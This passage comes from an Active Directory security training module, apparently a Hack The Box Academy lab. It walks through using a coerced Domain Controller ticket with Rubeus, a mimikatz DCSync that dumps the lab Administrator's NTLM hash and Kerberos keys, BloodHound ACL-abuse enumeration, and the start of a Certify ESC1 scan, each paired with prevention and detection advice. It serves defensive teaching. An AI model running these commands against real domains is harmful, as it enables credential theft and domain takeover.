  <span class="hljs-string">RenewTill             :</span>  <span class="hljs-number">24</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">09.28</span><span class="hljs-number">.39</span>
  <span class="hljs-string">Flags                 :</span>  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  <span class="hljs-string">Base64EncodedTicket   :</span>

doIFdDCCBXCgAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0    GwtFQUdMRS5MT0NBTKOCBDowggQ2oAMCARKhAwIBAqKCBCgEggQkv8ILT9IdJgNgjxbddnICsd5quqFnXS7m7YwJIM/lcwLy4SHI
i1iWbvsTiu078mz28R0sn7Mxvg2oVC7NTw+b2unvmQ3utRLTgaz02WYnGWSBu7gxs+Il/<span class="hljs-number">0</span>ekW5ZSX3ESq0AGwPaqUcuWSFDNNfOM
ws<span class="hljs-regexp">/8MlkJeFSFWeHwJL7FbzuCjZ2x/</span><span class="hljs-number">6</span>UUl2IOYq0Ozaf3R+rDJQ6LqpDVAet53IoHDugduBfZoDHTZFntRAoYrmAWdcnFdUEpyZGH    Kj6i2M0TyrxUp3nq022BNB6v+sHgH3SWsMNiba+TYaeRdjiM2nVjhGZTXDuro9rLkYFk1HPXuI/d0RfzVuq9Hh5hVCZRwcM3V2BN
eYRTMeW+lvz1bBgdgK<span class="hljs-regexp">/wlYMS7J99F1V/</span>r6K8zdO7pQ0Zj216DfA42QINPswVL+<span class="hljs-number">89</span>gy7PLLm5aYlw8nlbBdvTZrPbeOhtvdBy<span class="hljs-regexp">/pFB    fxrjHA+fW34/</span>Yk+<span class="hljs-number">9</span>k6oSPXCaCQ<span class="hljs-regexp">/Rd1qZ/</span>P57<span class="hljs-regexp">/0MDUYRlDs5EYOOxxGQPVFbOqhbG414vGRbi39ALj/</span>MkYG629kCEb9K89p5teo6f
<span class="hljs-number">7</span>w<span class="hljs-regexp">/4M6Ytun16sG3GxsWDG6dlZP+fmmOr0nwdXgvT28NQxQ3EEMErX+BojUY6DdRBH2u3fcv1KOA5K7MDma+cVLaa0YjSYZ2IDRaC    0JcgcUexd6EfQPtSnikaA/</span>zzYmu<span class="hljs-regexp">/PSYVXlcg7cFULJIiPuN4f9VlDlVOqj8C3xCwtYo4zRklLESUES9tGK/</span>VfsmN0Q/Fx5ULIa7y
UND<span class="hljs-regexp">/d1HlQ+R6Fnh2GGUPk+LlVw+ScD0kf2nmmlsIwhnGmscpiFs1lprX35Khlx/</span>y5+v9S7bdokZujPpyZactQ4wdfRK++bOWo2ao    Ewrzjuq199JnTQHbxkqGgeKQedOPxOhDccQLYTm44wH73JuE+XoGKmdGbgXfjSBFlTinP9mvZA12NkQupnGYVzJ2rS1T0nf2VVUW
MfIgh8Nz4xYvDHV1iIV4ZrLI7u7ZwJtrlESgO0H0d/k6CpLxo5L7kzhkU+MJggdUFJvS3HskTxZmewEwSdKJn21YfAG1Q6X0nFqk
HdK3RUvxXcycwMvWdfYH2AW06+<span class="hljs-number">98</span>q5h+TSJQrMcrp9gT+khLPD4KL2n6+cvC3BVHqge5Nc16LhW7kcNp+JcIzknwAsCZlaXzhz3X
K78ooLfZGaKGoNnDWLUQpYToVgXXSO53HJ3Vgl0MwctV7l+gJdwMtac0VVhH8EAndeSPnEcNOX8mr<span class="hljs-regexp">/30k+9GwM1wtFQNFB03CdoA    qRJBjyFw1h1KKuc61PTWuxVLwGmezshekwoSLOJ7V9G9qNpVQl0AgtTK2SHeobItuD4rhDc3/</span><span class="hljs-number">0</span>jJ4LzsXJieYbLK7dtVfxYtSbeu
ZqXhd7HcSq5SN4LOmEP1tScir+shxQC+hbs3oYx<span class="hljs-regexp">/rHfj8GDDEZ8UwY6I4JF4pQsApKOB3zCB3KADAgEAooHUBIHRfYHOMIHLoIHI    MIHFMIHCoCswKaADAgESoSIEIDs9gBc+2myj4I7mPmXH542vha3A2zfkHbm/</span>RxnK4oMSoQ0bC0VBR0xFLkxPQ0FMohEwD6ADAgEB
oQgwBhsEREMxJKMHAwUAYKEAAKURGA8yMDIyMTIxODIyMzAyMVqmERgPMjAyMjEyMTkwODMwMjFapxEYDzIwMjIxMjI0MDgyODM5
WqgNGwtFQUdMRS5MT0NBTKkgMB6gAwIBAqEXMBUbBmtyYnRndBsLRUFHTEUuTE9DQUw=

[*] Ticket cache <span class="hljs-string">size:</span> <span class="hljs-number">5</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A11/DCTGT.png" alt="DC1 TGT"></p>
<p>We can use this TGT for authentication within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack (among others).</p>
<p>One way of using the abovementioned TGT is through Rubeus, as follows.</p>
<p>Coercing Attacks &amp; Unconstrained Delegation</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
PS C:\Users\bob\Downloads&gt; klist

Current LogonId is 0:0x101394

Cached Tickets: (1)

#0&gt;     Client: DC1$ @ EAGLE.LOCAL
        Server: krbtgt/EAGLE.LOCAL @ EAGLE.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 4/21/2023 8:54:04 (local)
        End Time:   4/21/2023 18:54:04 (local)
        Renew Time: 4/28/2023 8:54:04 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -&gt; PRIMARY
        Kdc Called:</span>
</code></pre>
<p>Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.</p>
<p>Coercing Attacks &amp; Unconstrained Delegation</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads\mimikatz_trunk\x64&gt; .\mimikatz.exe <span class="hljs-string">"lsadump::dcsync /domain:eagle.local /user:Administrator"</span>

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:eagle.local /user:Administrator
[DC] <span class="hljs-symbol">'eagle.local</span>' will be the domain
[DC] <span class="hljs-symbol">'DC1.eagle.local</span>' will be the DC server
[DC] <span class="hljs-symbol">'Administrator</span>' will be the user account
[rpc] Service  : <span class="hljs-type">ldap</span>
[rpc] AuthnSvc : <span class="hljs-type">GSS_NEGOTIATE</span> (<span class="hljs-number">9</span>)

Object RDN           : <span class="hljs-type">Administrator</span>

** SAM ACCOUNT **

SAM Username         : <span class="hljs-type">Administrator</span>
Account <span class="hljs-keyword">Type</span>         <span class="hljs-type">: </span><span class="hljs-number">30000000</span> ( USER_OBJECT )
User Account Control : 00010200 ( <span class="hljs-type">NORMAL_ACCOUNT</span> DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 02.00.00
Password last change : 07/08/2022 21.24.13
Object Security ID   : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1518138621</span>-<span class="hljs-number">4282902758</span>-<span class="hljs-number">752445584</span>-<span class="hljs-number">500</span>
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6<span class="hljs-type">fd69313922373216cdbbfa823bd268d</span>

* Primary:Kerberos-Newer-Keys *
    Default Salt : <span class="hljs-type">WIN</span>-FM93RI8QOKQAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (<span class="hljs-number">4096</span>) : 1<span class="hljs-type">c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3</span>
      aes128_hmac       (<span class="hljs-number">4096</span>) : 4667<span class="hljs-type">ae9266d48c01956ab9c869e4370f</span>
      des_cbc_md5       (<span class="hljs-number">4096</span>) : <span class="hljs-type">d9b53b1f6d7c45a8</span>

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : <span class="hljs-type">WIN</span>-FM93RI8QOKQAdministrator
    Credentials
      des_cbc_md5       : <span class="hljs-type">d9b53b1f6d7c45a8</span>


mimikatz # <span class="hljs-keyword">exit</span>
Bye!
</code></pre>
<hr>
<h3 id="prevention">Prevention</h3>
<p>Windows does not offer granular visibility and control over RPC calls to allow discovering what is being used and block certain functions. Therefore, an out-of-the-box solution for preventing this attack does not exist currently. However, there are two different general approaches to preventing coercing attacks:</p>
<ol>
<li>Implementing a third-party RPC firewall, such as the one from <a href="https://github.com/zeronetworks/rpcfirewall">zero networks</a>, and using it to block dangerous RPC functions. This tool also comes up with an audit mode, allowing monitoring and gaining visibility on whether business disruptions may occur by using it or not. Moreover, it goes a step further by providing the functionality of blocking RPC functions if the dangerous <code>OPNUM</code> associated with coercing is present in the request. (Note that in this option, for every newly discovered RPC function in the future, we will have to modify the firewall&#39;s configuration file to include it.)</li>
<li>Block Domain Controllers and other core infrastructure servers from connecting to outbound ports <code>139</code> and <code>445</code>, <code>except</code> to machines that are required for AD (as well for business operations). One example is that while we block general outbound traffic to ports 139 and 445, we still should allow it for cross Domain Controllers; otherwise, domain replication will fail. (The benefit of this solution is that it will also work against newly discovered vulnerable RPC functions or other coercing methods.)</li>
</ol>
<hr>
<h3 id="detection">Detection</h3>
<p>As mentioned, Windows does not provide an out-of-the-box solution for monitoring RPC activity. The RPC Firewall from <a href="https://github.com/zeronetworks/rpcfirewall">zero networks</a> is an excellent method of detecting the abuse of these functions and can indicate immediate signs of compromise; however, if we follow the general recommendations to not install third-party software on Domain Controllers then firewall logs are our best chance.</p>
<p>A successful coercing attack with Coercer will result in the following host firewall log, where the machine at <code>.128</code> is the attacker machine and the <code>.200</code> is the Domain Controller:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A11/Coercer-FirewallLogs.png" alt="DC1 TGT"></p>
<p>We can see plenty of incoming connections to the DC, followed up by outbound connections from the DC to the attacker machine; this process repeats a few times as Coercer goes through several different functions. All of the outbound traffic is destined for port 445.</p>
<p>If we go forward and block outbound traffic to port 445, then we will observe the following behavior:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A11/Coercer-FirewallLogsBlockOutbound139n445.png" alt="DC1 TGT"></p>
<p>Now we can see that even though the inbound connection is successful, the firewall drops the outbound one, and consequently, the attacker does not receive any coerced TGTs. Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports <code>139</code> and <code>445</code> is recommended.</p>
<p>The above can also be used for detection, as any unexpected dropped traffic to ports <code>139</code> or <code>445</code> is suspicious.</p>
<h2 id="object-acls">Object ACLs</h2>
<hr>
<h3 id="description">Description</h3>
<p>In Active Directory, <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">Access Control Lists (ACLs)</a> are tables, or simple lists, that define the trustees who have access to a specific object and their access type. A trustee may be any security principal, such as a user account, group, or login session. Each <code>access control list</code> has a set of <code>access control entries</code> (<code>ACE</code>), and each ACE defines the trustee and the type of access the trustee has. Therefore, an object can be accessed by multiple trustees since there can be various ACEs. Access control lists are also used for auditing purposes, such as recording the number of access attempts to a securable object and the type of access. A securable object is any named object in Active Directory that contains a security descriptor, which has the security information about the object, which includes ACLs.</p>
<p>An example of an <code>Access Control Entry</code> is that, by default, AD gives Domain Admins the right to modify the password of every object. However, rights can also be delegated to certain users or groups that can perform a specific action on other objects; this can be password resets, modification of group membership, or deletion of objects. In large organizations, if it is virtually impossible to avoid non-privileged users ending up with delegated rights, they should eliminate human error and have well-defined process documentation. For example, suppose an employee was to (accidentally/intentionally) change their department from IT to Security Operations. In that case, the organization must have a process to revoke all rights and access to systems and applications. In real-life AD environments, we will often encounter cases such as:</p>
<ul>
<li>All Domain users added as Administrators to all Servers</li>
<li>Everyone can modify all objects (having full rights to them).</li>
<li>All Domain users have access to the computer&#39;s extended properties containing the LAPS passwords.</li>
</ul>
<hr>
<h3 id="attack">Attack</h3>
<p>To identify potential abusable ACLs, we will use <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> to scan the environment and pass <code>All</code> to the <code>-c</code> parameter (short version of <code>CollectionMethod</code>):</p>
<p>Object ACLs</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">bob</span>\<span class="hljs-selector-tag">Downloads</span>&gt; .\<span class="hljs-selector-tag">SharpHound</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-keyword">All</span>

<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:16</span><span class="hljs-selector-pseudo">:39.1749601+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">This</span> <span class="hljs-selector-tag">version</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">SharpHound</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">compatible</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.2</span> <span class="hljs-selector-tag">Release</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">BloodHound</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:16</span><span class="hljs-selector-pseudo">:39.3312221+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Resolved</span> <span class="hljs-selector-tag">Collection</span> <span class="hljs-selector-tag">Methods</span>: <span class="hljs-selector-tag">Group</span>, <span class="hljs-selector-tag">LocalAdmin</span>, <span class="hljs-selector-tag">GPOLocalGroup</span>, <span class="hljs-selector-tag">Session</span>, <span class="hljs-selector-tag">LoggedOn</span>, <span class="hljs-selector-tag">Trusts</span>, <span class="hljs-selector-tag">ACL</span>, <span class="hljs-selector-tag">Container</span>, <span class="hljs-selector-tag">RDP</span>, <span class="hljs-selector-tag">ObjectProps</span>, <span class="hljs-selector-tag">DCOM</span>, <span class="hljs-selector-tag">SPNTargets</span>, <span class="hljs-selector-tag">PSRemote</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:16</span><span class="hljs-selector-pseudo">:39.3468314+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Initializing</span> <span class="hljs-selector-tag">SharpHound</span> <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">14</span><span class="hljs-selector-class">.16</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">19</span>/<span class="hljs-selector-tag">12</span>/<span class="hljs-selector-tag">2022</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:16</span><span class="hljs-selector-pseudo">:39.5187113+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Flags</span>: <span class="hljs-selector-tag">Group</span>, <span class="hljs-selector-tag">LocalAdmin</span>, <span class="hljs-selector-tag">GPOLocalGroup</span>, <span class="hljs-selector-tag">Session</span>, <span class="hljs-selector-tag">LoggedOn</span>, <span class="hljs-selector-tag">Trusts</span>, <span class="hljs-selector-tag">ACL</span>, <span class="hljs-selector-tag">Container</span>, <span class="hljs-selector-tag">RDP</span>, <span class="hljs-selector-tag">ObjectProps</span>, <span class="hljs-selector-tag">DCOM</span>, <span class="hljs-selector-tag">SPNTargets</span>, <span class="hljs-selector-tag">PSRemote</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:16</span><span class="hljs-selector-pseudo">:39.7530826+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Beginning</span> <span class="hljs-selector-tag">LDAP</span> <span class="hljs-selector-tag">search</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">eagle</span><span class="hljs-selector-class">.local</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:16</span><span class="hljs-selector-pseudo">:39.7999574+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Producer</span> <span class="hljs-selector-tag">has</span> <span class="hljs-selector-tag">finished</span>, <span class="hljs-selector-tag">closing</span> <span class="hljs-selector-tag">LDAP</span> <span class="hljs-selector-tag">channel</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:16</span><span class="hljs-selector-pseudo">:39.7999574+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">LDAP</span> <span class="hljs-selector-tag">channel</span> <span class="hljs-selector-tag">closed</span>, <span class="hljs-selector-tag">waiting</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">consumers</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:09.8937530+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Status</span>: <span class="hljs-selector-tag">0</span> <span class="hljs-selector-tag">objects</span> <span class="hljs-selector-tag">finished</span> (+<span class="hljs-number">0</span> <span class="hljs-number">0</span>)/<span class="hljs-selector-tag">s</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">Using</span> <span class="hljs-selector-tag">36</span> <span class="hljs-selector-tag">MB</span> <span class="hljs-selector-tag">RAM</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:28.4874698+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Consumers</span> <span class="hljs-selector-tag">finished</span>, <span class="hljs-selector-tag">closing</span> <span class="hljs-selector-tag">output</span> <span class="hljs-selector-tag">channel</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:28.5343302+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Output</span> <span class="hljs-selector-tag">channel</span> <span class="hljs-selector-tag">closed</span>, <span class="hljs-selector-tag">waiting</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">output</span> <span class="hljs-selector-tag">task</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">complete</span>
<span class="hljs-selector-tag">Closing</span> <span class="hljs-selector-tag">writers</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:28.6124768+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Status</span>: <span class="hljs-selector-tag">114</span> <span class="hljs-selector-tag">objects</span> <span class="hljs-selector-tag">finished</span> (+<span class="hljs-number">114</span> <span class="hljs-number">2.375</span>)/<span class="hljs-selector-tag">s</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">Using</span> <span class="hljs-selector-tag">46</span> <span class="hljs-selector-tag">MB</span> <span class="hljs-selector-tag">RAM</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:28.6124768+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Enumeration</span> <span class="hljs-selector-tag">finished</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">00</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:48.8638030</span>
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:28.6905842+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">Saving</span> <span class="hljs-selector-tag">cache</span> <span class="hljs-selector-tag">with</span> <span class="hljs-selector-tag">stats</span>: <span class="hljs-selector-tag">74</span> <span class="hljs-selector-tag">ID</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">type</span> <span class="hljs-selector-tag">mappings</span>.
 <span class="hljs-selector-tag">76</span> <span class="hljs-selector-tag">name</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">SID</span> <span class="hljs-selector-tag">mappings</span>.
 <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">machine</span> <span class="hljs-selector-tag">sid</span> <span class="hljs-selector-tag">mappings</span>.
 <span class="hljs-selector-tag">2</span> <span class="hljs-selector-tag">sid</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">domain</span> <span class="hljs-selector-tag">mappings</span>.
 <span class="hljs-selector-tag">0</span> <span class="hljs-selector-tag">global</span> <span class="hljs-selector-tag">catalog</span> <span class="hljs-selector-tag">mappings</span>.
<span class="hljs-selector-tag">2022-12-19T14</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:28.6905842+01</span><span class="hljs-selector-pseudo">:00</span>|<span class="hljs-selector-tag">INFORMATION</span>|<span class="hljs-selector-tag">SharpHound</span> <span class="hljs-selector-tag">Enumeration</span> <span class="hljs-selector-tag">Completed</span> <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">14</span><span class="hljs-selector-class">.17</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">19</span>/<span class="hljs-selector-tag">12</span>/<span class="hljs-selector-tag">2022</span>! <span class="hljs-selector-tag">Happy</span> <span class="hljs-selector-tag">Graphing</span>!
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A12/Sharphound.png" alt="Sharphound execution"></p>
<p>The ZIP file generated by <code>SharpHound</code> can then be visualized in <code>BloodHound</code>. Instead of looking for every misconfigured ACL in the environment, we will focus on potential escalation paths that originate from the user Bob (our initial user, which we had already compromised and have complete control over). Therefore, the following image demonstrates the different access that Bob has to the environment:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A12/bloodhound.png" alt="BloodHound analysis"></p>
<p>Bob has full rights over the user Anni and the computer Server01. Below is what Bob can do with each of these:</p>
<ol>
<li>Case 1: Full rights over the user Anni. In this case, Bob can modify the object Anni by specifying some bonus SPN value and then perform the Kerberoast attack against it (if you recall, the success of this attack depends on the password&#39;s strength). However, Bob can also modify the password of the user Anni and then log in as that account, therefore, directly inheriting and being able to perform everything that Anni can (if Anni is a Domain admin, then Bob would have the same rights).</li>
<li>Case 2: Full control over a computer object can also be fruitful. If <code>LAPS</code> is used in the environment, then Bob can obtain the password stored in the attributes and authenticate as the local Administrator account to this server. Another escalation path is abusing <code>Resource-Based Kerberos Delegation</code>, allowing Bob to authenticate as anyone to this server. Recall that from the previous attack, Server01 is trusted for Unconstrained delegation, so if Bob was to get administrative rights on this server, he has a potential escalation path to compromise the identity of a Domain Controller or other sensitive computer object.</li>
</ol>
<p>We can also use <a href="https://github.com/canix1/ADACLScanner">ADACLScanner</a> to create reports of <code>discretionary access control lists</code> (<code>DACLs</code>) and <code>system access control lists</code> (<code>SACLs</code>).</p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>There are three things we can do:</p>
<ul>
<li>Begin <code>continuous assessment</code> to detect if this is a problem in the AD environment.</li>
<li><code>Educate</code> employees with high privileges to avoid doing this.</li>
<li><code>Automate</code> as much as possible from the access management process, and only assign privileged access to administrative accounts; this ensures that administrators don&#39;t manually edit accounts which reduces the risk of introducing delegated rights to unprivileged users.</li>
</ul>
<hr>
<h3 id="detection">Detection</h3>
<p>Fortunately, we have several ways to detect if AD objects are modified. Unfortunately, the events generated for modified objects are incomplete, as they do not provide granular visibility over what was changed. For example, in the first case described above, Bob modified Anni by adding an SPN value. By doing so, Bob will have the means to perform Kerberoasting against Anni. When the SPN value gets added, an event with the ID <code>4738</code>, &quot;A user account was changed&quot;, is generated. However, this event does not demonstrate all modified user properties, including the SPN. Therefore, the event only notifies about the modification of a user but does not specify what exactly was changed ( although it does have a fair amount of fields that can be useful). Below is the event that will be generated if Bob adds any bogus SPN value to Anni&#39;s User Object:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A12/detect1.png" alt="Anni was modified"></p>
<p>However, using this event, we can tell if a non-privileged user performs privileged actions on another user. If, for example, all privileged users have a naming convention that begins with &quot;adminxxxx&quot;, then any change not associated with &quot;adminxxxx&quot; is suspicious. If an ACL abuse leads to a password reset, the event ID <code>4724</code> will be logged.</p>
<p>Similarly, if Bob were to perform the second scenario, an event with ID <code>4742</code> would be generated, which is also unfortunately limited in the information it can provide; however, it notifies about the action that the user account Bob is compromised and used maliciously. The following was the event ID <code>4742</code> generated when Bob modified Server01:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A12/detect2.png" alt="Server01 was modified"></p>
<hr>
<h3 id="honeypot">Honeypot</h3>
<p>Misconfigured ACLs can be an effective mechanism of detection for suspicious behavior. There are two ways to approach this:</p>
<ol>
<li>Assign relatively high ACLs to a user account used as a honeypot via a previously discussed technique—for example, a user whose <code>fake</code> credentials are exposed in the description field. Having ACLs assigned to the account may provoke an adversary to attempt and verify if the account&#39;s exposed password is valid as it holds high potential.</li>
<li>Have an account that <code>everyone</code> or many users can modify. This user will ideally be a honeypot user, with some activity to mimic real users. Any changes occurring on this honeypot user are malicious since there is no valid reason for anyone to perform any actions on it (except admins, that may occasionally need to reset the account&#39;s password to make the account look realistic). Therefore, any event ID <code>4738</code> associated with the honeypot user should trigger an alert. Additionally, mature organizations may immediately disable the user performing the change and initiate a forensic investigation on the source device. For the sake of completeness, if we go back to the Bob/Anni example, a change to Anni&#39;s account would be detected as follows:</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A12/detect1.png" alt="Anni was modified"></p>
<h2 id="pki-esc1">PKI - ESC1</h2>
<hr>
<h3 id="description">Description</h3>
<p>After <code>SpectreOps</code> released the research paper <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf">Certified Pre-Owner</a>, <code>Active Directory Certificate Services</code> (<code>AD CS</code>) became one of the most favorite attack vectors for threat agents due to many reasons, including:</p>
<ol>
<li>Using certificates for authentication has more advantages than regular username/password credentials.</li>
<li>Most PKI servers were misconfigured/vulnerable to at least one of the eight attacks discovered by SpectreOps (various researchers have discovered more attacks since then).</li>
</ol>
<p>There are a plethora of advantages to using certificates and compromising the <code>Certificate Authority</code> (<code>CA</code>):</p>
<ul>
<li>Users and machines certificates are valid for 1+ years.</li>
<li>Resetting a user password does not invalidate the certificate. With certificates, it doesn&#39;t matter how many times a user changes their password; the certificate will still be valid (unless expired or revoked).</li>
<li>Misconfigured templates allow for obtaining a certificate for any user.</li>
<li>Compromising the CA&#39;s private key results in forging <code>Golden Certificates</code>.</li>
</ul>
<p>These advantages make certificates the preferred method for long-term persistence. While SpectreOps disclosed eight privilege escalation techniques, we will examine the first, <code>ESC1</code>, to demonstrate how it works. The description of <code>ESC1</code> is:</p>
<ul>
<li><code>Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code>.</li>
</ul>
<hr>
<h3 id="attack">Attack</h3>
<p>To begin with, we will use <a href="https://github.com/GhostPack/Certify">Certify</a> to scan the environment for vulnerabilities in the PKI infrastructure:</p>
<p>PKI - ESC1</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
